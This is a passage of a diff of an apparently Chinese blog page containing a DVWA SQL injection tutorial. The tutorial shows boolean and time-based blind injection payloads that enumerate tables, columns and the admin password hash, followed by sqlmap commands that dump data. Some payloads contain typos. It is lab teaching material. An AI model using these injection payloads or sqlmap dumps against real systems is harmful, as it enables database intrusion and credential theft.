xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span>是第几张表，下标从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>开始</p>
-<pre class="highlight"><code class="">1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=9#
+<p><code>limit i,j</code>  和 <code>select</code>  共同使用：用于接收 select 查询的结果从第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 行开始检索<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 行。一般<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 是第几张表，下标从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> 开始</p>
+<pre><code>1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=9#
 =&gt;User ID exists in the database. 说明第一个表的长度是9
 
 1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),1))=5#
@@ -645,24 +544,24 @@ if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个
 <li>
 <p>爆破表名</p>
 <p>和爆破数据库名的方法一样</p>
-<pre class="highlight"><code class="">1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))=103 #
+<pre><code>1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))=103 #
 =&gt;User ID exists in the database. 第一张表的第一个字符是g
 
 ...
 
 1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),5,1))=ascall(r) #
 </code></pre>
-<p>最终可以得到第一张表名是<code>guestbook</code>，第二张表是<code>user</code></p>
+<p>最终可以得到第一张表名是 <code>guestbook</code> ，第二张表是 <code>user</code></p>
 </li>
 <li>
-<p>猜测列的数量，以下只猜测<code>user</code>表的列</p>
-<pre class="highlight"><code class="">1' and (select count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')=8 #
+<p>猜测列的数量，以下只猜测 <code>user</code>  表的列</p>
+<pre><code>1' and (select count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')=8 #
 =&gt; User ID exists in the database. 列数量为8
 </code></pre>
 </li>
 <li>
 <p>猜测列长度</p>
-<pre class="highlight"><code class="">1' and length(substr( ( select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1 ),1) )=7#
+<pre><code>1' and length(substr( ( select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1 ),1) )=7#
 ...
 1' and length(substr( ( select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 7,1 ),1) )=12#
 </code></pre>
@@ -670,33 +569,33 @@ if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个
 </li>
 <li>
 <p>猜测列名</p>
-<pre class="highlight"><code class="">1' and length(substr( ( select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1 ),1,1) )=ascall_num#
+<pre><code>1' and length(substr( ( select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1 ),1,1) )=ascall_num#
 ...
 1' and length(substr( ( select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 7,1 ),12,1) )=ascall_num#
 </code></pre>
-<p>最后可以得到比较重要的两个列<code>user</code>和<code>password</code></p>
+<p>最后可以得到比较重要的两个列 <code>user</code>  和 <code>password</code></p>
 </li>
 <li>
 <p>猜测字段长度</p>
-<pre class="highlight"><code class="">1' and length(substr((select user from users limit 0,1),1))=5 #
+<pre><code>1' and length(substr((select user from users limit 0,1),1))=5 #
 </code></pre>
-<p><code>user</code>列的第一个字段长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>，然后依次的得到第二、三个字段的长度</p>
+<p><code>user</code>  列的第一个字段长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>，然后依次的得到第二、三个字段的长度</p>
 </li>
 <li>
 <p>猜测字段名称</p>
-<pre class="highlight"><code class="">1' and ascii(substr((select user from users limit 0,1),1,1))=97 #a
+<pre><code>1' and ascii(substr((select user from users limit 0,1),1,1))=97 #a
 </code></pre>
-<p>依次爆破，得到第一个字段是<code>admin</code>。同理爆破<code>password</code>得到密码，但dvwa这里的密码用md5加密了，所以会有点长，这里同样可以爆破或者根据题目背景猜测弱密码等，得到密码为<code>md5(password)=5f4dcc3b5aa765d61d8327deb882cf99</code></p>
+<p>依次爆破，得到第一个字段是 <code>admin</code> 。同理爆破 <code>password</code>  得到密码，但 dvwa 这里的密码用 md5 加密了，所以会有点长，这里同样可以爆破或者根据题目背景猜测弱密码等，得到密码为 <code>md5(password)=5f4dcc3b5aa765d61d8327deb882cf99</code></p>
 <p>验证爆破答案</p>
-<pre class="highlight"><code class="">1' and (select count(*) from users where user='admin'  and password='5f4dcc3b5aa765d61d8327deb882cf9')=1 #
+<pre><code>1' and (select count(*) from users where user='admin'  and password='5f4dcc3b5aa765d61d8327deb882cf9')=1 #
 </code></pre>
 </li>
 <li>
-<p>每个都可以用<code>BurpSuite</code>的<code>intruder</code>功能爆破</p>
+<p>每个都可以用 <code>BurpSuite</code>  的 <code>intruder</code>  功能爆破</p>
 </li>
 <li>
-<p>还可以用<code>sqlmap</code></p>
-<pre class="highlight"><code class="">-u 指定注入点
+<p>还可以用 <code>sqlmap</code></p>
+<pre><code>-u 指定注入点
 --dbs 跑库名
 --tables 跑表名
 --columns 跑字段名
@@ -704,52 +603,44 @@ if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个
 </code></pre>
 </li>
 </ul>
-<h3 id="2时间盲注"><a class="markdownIt-Anchor" href="#2时间盲注"></a> 2.时间盲注</h3>
-<p>布尔盲注是通过页面返回正误来判断，而在没有回显正误的条件下，可以考虑是否可以进行时间盲注，一般通过<code>if</code>语句连接判断条件和<code>sleep</code>函数，如果判断条件成立，页面会有延时，否则就没有延时</p>
+<h3 id="2时间盲注"><a class="markdownIt-Anchor" href="#2时间盲注">#</a> 2. 时间盲注</h3>
+<p>布尔盲注是通过页面返回正误来判断，而在没有回显正误的条件下，可以考虑是否可以进行时间盲注，一般通过 <code>if</code>  语句连接判断条件和 <code>sleep</code>  函数，如果判断条件成立，页面会有延时，否则就没有延时</p>
 <ul>
 <li>
 <p>判断是否可以使用时间盲注</p>
-<pre class="highlight"><code class="">1' and slepp(5) #
+<pre><code>1' and slepp(5) #
 </code></pre>
 </li>
 <li>
 <p>判断数据库长度</p>
-<pre class="highlight"><code class="">1' and if((lenght(database()))=len, slepp(5) ,1) #
+<pre><code>1' and if((lenght(database()))=len, slepp(5) ,1) #
 </code></pre>
 </li>
 <li>
 <p>猜测数据库名</p>
-<pre class="highlight"><code class="">1' and if((ascii(substr(database(),1,1)))=ascall_num,sleep(5),1) #
+<pre><code>1' and if((ascii(substr(database(),1,1)))=ascall_num,sleep(5),1) #
 </code></pre>
 </li>
 <li>
 <p>方法布尔盲注差不多，只不过是判断条件不同而已</p>
 </li>
 </ul>
-<h4 id="3报错盲注"><a class="markdownIt-Anchor" href="#3报错盲注"></a> 3.报错盲注</h4>
-<h2 id="4sqlmap的使用"><a class="markdownIt-Anchor" href="#4sqlmap的使用"></a> 4.sqlmap的使用</h2>
+<h4 id="3报错盲注"><a class="markdownIt-Anchor" href="#3报错盲注">#</a> 3. 报错盲注</h4>
+<h2 id="4sqlmap的使用"><a class="markdownIt-Anchor" href="#4sqlmap的使用">#</a> 4.sqlmap 的使用</h2>
 <ul>
 <li>
 <p>支持的数据库类型：</p>
-<pre class="highlight"><code class="">MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+<pre><code>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
 </code></pre>
 </li>
 <li>
 <p>常用命令</p>
-<pre class="highlight"><code class="shell">sqlmap -u url/ip
-sqlmap -u ip --forms  #POST注入，读取页面中POST传参的表单的传参名然后进行SQL注入
-sqlmap -u ip --forms --dbs #跑库名
--D 指定库 -T 指定表 -C 指定字段
-sqlmap -u ip --forms -D post_error --tables #跑表名
-sqlmap -u ip --forms -D post_errow -T flag --colnums #字段名
-sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
-</code></pre>
-<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaG9uZ2ZlaS9wLzM4NzIxNTYuaHRtbA==">更具体的使用链接</span></p>
+<figure class="highlight shell"><figcaption data-lang="Bash"><span>l</span></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap -u url/ip</pre></td></tr><tr><td data-num="2"></td><td><pre>sqlmap -u <span class="token function">ip</span> --forms  <span class="token comment">#POST 注入，读取页面中 POST 传参的表单的传参名然后进行 SQL 注入</span></pre></td></tr><tr><td data-num="3"></td><td><pre>sqlmap -u <span class="token function">ip</span> --forms --dbs <span class="token comment">#跑库名</span></pre></td></tr><tr><td data-num="4"></td><td><pre>-D 指定库 -T 指定表 -C 指定字段</pre></td></tr><tr><td data-num="5"></td><td><pre>sqlmap -u <span class="token function">ip</span> --forms -D post_error --tables <span class="token comment">#跑表名</span></pre></td></tr><tr><td data-num="6"></td><td><pre>sqlmap -u <span class="token function">ip</span> --forms -D post_errow -T flag --colnums <span class="token comment">#字段名</span></pre></td></tr><tr><td data-num="7"></td><td><pre>sqlmap -u <span class="token function">ip</span> --forms -D post_errow -T flag -C flag --dump <span class="token comment">#出数据</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaG9uZ2ZlaS9wLzM4NzIxNTYuaHRtbA==">更具体的使用链接</span></p>
 </li>
 </ul>
 <p>参考链接</p>
-<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI4MTU1OS5odG1s">SQL注入之盲注</span></p>
-<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsbGVuX18wL2FydGljbGUvZGV0YWlscy8xMDM5NzU3OTI=">dvwa模拟实验2——sql盲注</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI4MTU1OS5odG1s">SQL 注入之盲注</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsbGVuX18wL2FydGljbGUvZGV0YWlscy8xMDM5NzU3OTI=">dvwa 模拟实验 2——sql 盲注</span></p>
 
       <div class="tags">
           <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"><i class="ic i-tag"></i> web安全</a>
@@ -819,7 +710,7 @@ sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
     <div class="item left">
       
 
-  <a href="/2022/05/17/Misc1/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph47e9vtj20zk0m8x6l.jpg" title="Misc1">
+  <a href="/2022/05/17/Misc1/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexj2jgzj20zk0m8b09.jpg" title="Misc1">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>Misc1</h3>
@@ -829,7 +720,7 @@ sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
     <div class="item right">
       
 
-  <a href="/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF-polydiv/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicmnywqgpj20zk0m8dwx.jpg" title="强网杯-polydiv">
+  <a href="/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF-polydiv/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclx29mstj20zk0m8hdt.jpg" title="强网杯-polydiv">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>强网杯-polydiv</h3>
@@ -851,7 +742,7 @@ sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5dvwa"><span class="toc-number">1.</span> <span class="toc-text"> SQL注入(DVWA)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1low-%E5%8F%AF%E4%BB%A5%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.Low (可以手工注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.1.</span> <span class="toc-text"> MYSQL结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 注入流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 闭合方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%8F%AF%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.1.</span> <span class="toc-text"> 1.可联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.4.2.</span> <span class="toc-text"> 2.堆叠查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%85%B3%E9%94%AE%E8%AF%8D%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.5.</span> <span class="toc-text"> 3.关键词被过滤的替代方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.6.</span> <span class="toc-text"> 4.报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E4%BE%8B%E9%A2%98"><span class="toc-number">1.1.7.</span> <span class="toc-text"> 5.例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.1.7.1.</span> <span class="toc-text"> 1.[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019hardsql1"><span class="toc-number">1.1.7.2.</span> <span class="toc-text"> 2.[极客大挑战 2019]HardSQL1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2medium%E6%97%A0%E6%B3%95%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B2%A1%E6%9C%89%E8%BE%93%E5%85%A5%E6%A1%86%E8%BF%99%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.Medium(无法手工注入，没有输入框这类)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dvwa%E7%9B%B2%E6%B3%A8%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.3.1.0.1.</span> <span class="toc-text"> DVWA盲注实验</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.2.1.</span> <span class="toc-text"> 3.报错盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.sqlmap的使用</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5dvwa"><span class="toc-number">1.</span> <span class="toc-text"> SQL 注入 (DVWA)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1low-%E5%8F%AF%E4%BB%A5%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.Low (可以手工注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.1.</span> <span class="toc-text"> MYSQL 结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 注入流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 闭合方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%8F%AF%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.1.</span> <span class="toc-text"> 1. 可联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.4.2.</span> <span class="toc-text"> 2. 堆叠查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%85%B3%E9%94%AE%E8%AF%8D%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.5.</span> <span class="toc-text"> 3. 关键词被过滤的替代方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.6.</span> <span class="toc-text"> 4. 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E4%BE%8B%E9%A2%98"><span class="toc-number">1.1.7.</span> <span class="toc-text"> 5. 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.1.7.1.</span> <span class="toc-text"> 1.[强网杯 2019] 随便注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019hardsql1"><span class="toc-number">1.1.7.2.</span> <span class="toc-text"> 2.[极客大挑战 2019] HardSQL1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2medium%E6%97%A0%E6%B3%95%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B2%A1%E6%9C%89%E8%BE%93%E5%85%A5%E6%A1%86%E8%BF%99%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.Medium (无法手工注入，没有输入框这类)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.</span> <span class="toc-text"> 3. 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1. 布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dvwa%E7%9B%B2%E6%B3%A8%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.3.1.0.1.</span> <span class="toc-text"> DVWA 盲注实验</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2. 时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.2.1.</span> <span class="toc-text"> 3. 报错盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.sqlmap 的使用</span></a></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
       </div>
@@ -866,7 +757,7 @@ sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">24</span>
+        <span class="count">25</span>
         <span class="name">posts</span>
       </a>
     </div>
@@ -936,7 +827,7 @@ sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/12/11/reverse%E6%B3%9B%E5%81%9A1/" title="reverse泛做1">reverse泛做1</a></span>
+    <span><a href="/2023/01/06/2022Nepnep%E8%B7%A8%E5%B9%B4%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0%E5%92%8C%E6%80%BB%E7%BB%93/" title="2022Nepnep跨年比赛复现和总结">2022Nepnep跨年比赛复现和总结</a></span>
   </li>
 
       
@@ -945,7 +836,7 @@ sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/05/08/hello-world/" title="Hello World">Hello World</a></span>
+    <span><a href="/2022/09/29/NTRU/" title="NTRU">NTRU</a></span>
   </li>
 
       
@@ -954,16 +845,7 @@ sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/12/26/PWNHUB-%E5%A4%8D%E7%8E%B0/" title="PWNHUB-复现">PWNHUB-复现</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/03/08/SROP/" title="SROP">SROP</a></span>
+    <span><a href="/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF-polydiv/" title="强网杯-polydiv">强网杯-polydiv</a></span>
   </li>
 
       
@@ -981,6 +863,33 @@ sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
 <div class="breadcrumb">
 </div>
 
+    <span><a href="/2022/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AFre%E3%80%81Crypto/" title="网鼎杯re、Crypto">网鼎杯re、Crypto</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/12/26/PWNHUB-%E5%A4%8D%E7%8E%B0/" title="PWNHUB-复现">PWNHUB-复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/07/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="sql注入学习">sql注入学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
     <span><a href="/2022/08/24/%E9%95%BF%E5%9F%8E%E6%9D%AFCrypto/" title="长城杯Crypto">长城杯Crypto</a></span>
   </li>
 
@@ -990,7 +899,7 @@ sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/09/03/Sage%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Sage的使用">Sage的使用</a></span>
+    <span><a href="/2022/12/11/reverse%E6%B3%9B%E5%81%9A1/" title="reverse泛做1">reverse泛做1</a></span>
   </li>
 
       
@@ -999,25 +908,7 @@ sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/02/21/idek2022%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="idek2022部分复现">idek2022部分复现</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/05/10/pwn-sandbox1/" title="pwn-sandbox1">pwn-sandbox1</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/03/i%E6%98%A5%E7%A7%8B%E5%8B%87%E8%80%85%E4%B9%8B%E5%B7%85Crypto%E5%AD%A6%E4%B9%A0/" title="i春秋勇者之巅Crypto学习">i春秋勇者之巅Crypto学习</a></span>
+    <span><a href="/2023/04/16/largebin-attach/" title="largebin_attach">largebin_attach</a></span>
   </li>
 
   </ul>
